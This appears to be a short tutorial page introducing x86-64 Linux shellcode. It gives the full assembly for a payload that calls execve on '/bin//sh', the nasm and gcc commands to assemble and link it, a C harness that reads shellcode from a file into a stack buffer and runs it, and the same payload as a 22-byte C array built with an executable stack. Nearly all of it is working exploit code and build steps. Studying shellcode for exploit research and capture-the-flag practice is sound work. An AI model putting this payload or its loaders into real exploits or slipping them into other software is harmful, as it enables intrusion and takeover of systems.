# Shellcode Introduction

## Testing

### nasm

- Compile shellcode binary
    - Source (`shellcode.s`)
        ```
        BITS 64
        xor esi, esi
        push rsi
        mov rbx, 0x68732f2f6e69622f
        push rbx
        push rsp
        pop rdi
        imul esi
        mov al, 0x3b
        syscall
        ```
    - Compile `shellcode.s` to `shellcode.bin`
        ```bash
        nasm shellcode.s -o shellcode.bin
        ```
    - Disassemble `shellcode.bin`
        ```bash
        ndisasm -b 64 shellcode.bin
        ```
- Compile shellcode to an ELF executable
    - Source (`shellcode.s`)
        ```
        BITS 64
        _start:
            xor esi, esi
            push rsi
            mov rbx, 0x68732f2f6e69622f
            push rbx
            push rsp
            pop rdi
            imul esi
            mov al, 0x3b
            syscall
        ```
    - Compile `shellcode.s` to `shellcode.o`
        ```bash
        nasm -f elf64 shellcode.s -o shellcode.o
        ```
    - Link `shellcode.o` using gcc
        ```bash
        gcc shellcode.o -nostdlib -o shellcode
        ```

### Debug Shellcode

- Method 1
    1. output `shellcode.bin` as C array
        ```bash
        xxd -i shellcode.bin
        ```
    2. Goto [Debug Shellcode From C array](#)
- Method 2
    1. Read shellcode binary from file
        ```c
        #include <stdio.h>
        #include <stdlib.h>
        #define SHELLCODE_LENGTH 4096
        int main(int argc, char *argv[]) {
            if (argc != 2) {
                fprintf(stderr, "usage: ./shellcode_test [BINARY FILE]");
                exit(EXIT_FAILURE);
            }
            char shellcode[SHELLCODE_LENGTH]; // shellcode
            FILE *fp = fopen(argv[1], "rb");
            if (fp == NULL) {
                fprintf(stderr, "Cannot open file %s\n", argv[1]);
                exit(EXIT_FAILURE);
            }
            fread(shellcode, SHELLCODE_LENGTH, 1, fp);
            if (ferror(fp)) {
                fprintf(stderr, "Cannot read file %s\n", argv[1]);
                exit(EXIT_FAILURE);
            }
            int (*run)() = (int(*)())shellcode;
            run();
        }
        ```
    2. Compile
        ```bash
        gcc shellcode.c -z execstack -o shellcode
        ```
    3. Debug using gdb

### From C array

1. Generate C source (`shellcode.c`)
    ```c
    int main() {
        unsigned char shellcode[] = {
            0x31, 0xf6, 0x56, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73,
            0x68, 0x53, 0x54, 0x5f, 0xf7, 0xee, 0xb0, 0x3b, 0x0f, 0x05
        };
        void (*run)() = (void(*)())shellcode;
        run();
    }
    ```
2. Compile
    ```bash
    gcc shellcode.c -z execstack -o shellcode
    ```
3. Debug using gdb
